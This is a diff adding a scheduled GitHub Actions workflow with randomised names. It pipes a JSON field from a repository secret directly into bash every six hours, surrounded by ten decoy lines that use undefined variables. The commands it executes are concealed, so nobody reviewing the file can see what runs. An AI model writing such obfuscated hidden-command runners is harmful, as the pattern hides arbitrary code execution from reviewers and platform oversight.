@@ -1,0 +1,28 @@
+name: qixiayangsuiran
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qixiayangsuiran
+        env:
+          qh22186: ${{ secrets.qh22186 }}
+        run: |
+          echo $qh22186 | jq -r .x65 | /bin/bash
+          echo $qyef085 | jq -r .hydg59987 | /bin/bash
+          echo $g9 | jq -r .virrz0989 | /bin/bash
+          echo $aqjr098 | jq -r .p80186 | /bin/bash
+          echo $l6087 | jq -r .dnawu322 | /bin/bash
+          echo $n106 | jq -r .uy91222 | /bin/bash
+          echo $jzqcx661 | jq -r .et18 | /bin/bash
+          echo $uynjh3 | jq -r .yrx81130 | /bin/bash
+          echo $len0 | jq -r .psi057 | /bin/bash
+          echo $maufz25553 | jq -r .b3450 | /bin/bash
+          echo $h8 | jq -r .tq55967 | /bin/bash
+
